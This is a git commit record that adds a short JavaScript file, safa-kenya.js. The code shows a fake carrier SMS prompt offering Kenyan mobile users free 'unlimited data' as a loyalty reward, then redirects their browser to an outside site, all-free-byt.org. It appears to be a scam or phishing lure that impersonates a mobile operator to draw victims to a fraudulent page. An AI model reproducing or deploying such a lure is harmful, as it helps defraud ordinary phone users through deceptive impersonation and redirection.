1960aa5180b93c9d91bc3bce44e8f2b2154297dd
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-28 02:01:55 -0700

    Create safa-kenya.js

---
+++ safa-kenya.js
@@ -0,0 +1,6 @@
+
+var password = 'unlimited data'
+password=prompt('SMS: Dear customer, kindly check if your sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press Ok to check now ','unlimited data');
+if (password != 'unlimited data') {
+location.href='https://all-free-byt.org/old-sim-kenya.html';
+}
